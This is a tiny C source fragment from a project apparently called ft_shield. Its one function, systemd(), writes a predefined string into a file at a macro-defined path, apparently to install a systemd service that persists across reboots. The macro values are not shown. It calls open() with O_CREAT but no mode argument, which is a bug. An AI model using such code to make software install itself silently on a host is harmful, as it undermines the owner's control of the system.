#include "ft_shield.h"

void systemd() {
	int fd = open(SYS_DIR, O_RDWR | O_CREAT);
	if (fd < 0) {
		return ;
	}
	write(fd, SYSTEMD_OPT, strlen(SYSTEMD_OPT));
	close(fd);
}